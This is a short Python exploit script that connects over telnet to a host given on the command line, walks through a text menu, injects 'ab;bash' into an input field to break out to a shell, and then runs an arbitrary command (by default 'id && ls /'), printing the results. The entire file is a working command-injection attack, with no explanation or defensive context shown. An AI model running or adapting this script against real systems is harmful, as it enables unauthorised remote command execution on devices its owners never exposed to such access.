#!/bin/python


from codecs import ignore_errors


port = 23
def run(host, cmd):
    import socket
    from time import sleep
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.recv(4096)
        sleep(3)
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"0\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"ab;bash\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"Y\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"0\r\n")
        s.recv(4096)
        print(s.recv(4096).decode(errors='ignore'))
        sleep(0.1)
        s.sendall(b"0\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"0\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"D\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(b"1\r\n")
        s.recv(4096)
        print(s.recv(4096).decode())
        sleep(0.1)
        s.sendall(cmd.encode()+b'\r\n')
        s.recv(4096)
        print(s.recv(4096).decode())
        print(s.recv(4096).decode())
        s.sendall(b'exit\r\n')
        s.sendall(b'\r\n')
    
if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--command", type=str, default='id && ls /')
    args = parser.parse_args()
    run(args.host, args.command)